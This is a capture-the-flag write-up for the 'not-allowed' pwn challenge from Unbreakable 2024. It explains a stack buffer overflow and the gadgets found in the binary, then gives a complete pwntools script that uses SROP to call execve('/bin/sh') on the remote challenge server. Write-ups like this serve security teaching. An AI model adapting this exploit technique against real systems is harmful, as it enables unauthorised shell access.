---
title: not-allowed
type: writeup
date: 2024-04-07T14:23:28+03:00
description: Writeup for not-allowed [Unbreakable 2024]
author: sunbather
tags:
- pwn
- srop
draft: false
---
___

## Challenge Description

Silence speaks louder than words.

## Intuition

We receive a simple binary with two functions: *main* and *wish*. The main function sets up stream buffering with *setvbufs* and then does a call to fgets that is obviously overflowing the destination buffer.

```c
void main(void)
{
  char local_28 [32];
  
  setup(stdin,0,2,0);
  setup(stdout,0,2,0);
  setup(stderr,0,2,0);
  fgets(local_28,600,stdin);
  return;
}
```
Since the stack is NX, our remaining option is to ROP. Sadly we don't have a lot of gadgets, but we do notice a few important ones when dumping with ROPgadget:

```
0x00000000004011ce : inc al ; ret
0x0000000000401156 : pop rdi ; ret
0x000000000040101a : ret
0x0000000000401162 : sub eax, eax ; ret
0x00000000004011cc : syscall
```

We have control over RAX, RDI and we also have a syscall gadget. Sadly however, the imported libc functions do not let us print anything! So we cannot leak libc and jump to *system* or *execve*. We can, however, do SROP! We can craft a signal return frame on the stack and then trigger it using a sigreturn syscall. But how do we get an address for ``/bin/sh``? The *wish* function has everything prepared for us:

```c
void wish(void)
{
  string[0] = 'H';
  string[1] = 'e';
  string[2] = 'r';
  string[3] = 'e';
  string[4] = ' ';
  string[5] = 'y';
  string[6] = 'o';
  string[7] = 'u';
  string[8] = ' ';
  string[9] = 'g';
  string[10] = 'o';
  string[11] = ':';
  string[12] = ' ';
  string[13] = '/';
  string[14] = 'b';
  string[15] = 'i';
  string[16] = 'n';
  string[17] = '/';
  string[18] = 's';
  string[19] = 'h';
  string[20] = '\0';
  return;
}
```
We simply need to get the address corresponding to ``string[13]`` and call this function before we use the sigreturn syscall. Binary is non-PIE so getting the addresses to all those gadgets and objects is trivial.

## Solution

```py
#!/usr/bin/env python3

from pwn import *

context.clear()
context.arch = "amd64"

#target = process("./not-allowed")
target = remote("34.141.109.85", 31555)

wish_addr = 0x00401175
sh_addr = 0x40407d
syscall_gadget = 0x4011cc
inc_al_gadget = p64(0x00000000004011ce)
zero_rax = p64(0x0000000000401161)

# frame that will call execve(/bin/sh)
frame = SigreturnFrame()
frame.rax = 59 # syscall code for execve
frame.rdi = sh_addr
frame.rsi = 0
frame.rdx = 0
frame.rsp = 0
frame.rip = syscall_gadget

# 1. call wish
# 2. zero out rax w/ sub eax, eax
# 3. increment RAX to 15 (sigreturn)
# 4. syscall sigreturn
# 5. ???
# 6. profit
payload = b"a" * 0x28 + p64(wish_addr) + zero_rax + inc_al_gadget * 15 + p64(syscall_gadget) + bytes(frame)

target.sendline(payload)
target.interactive()
```

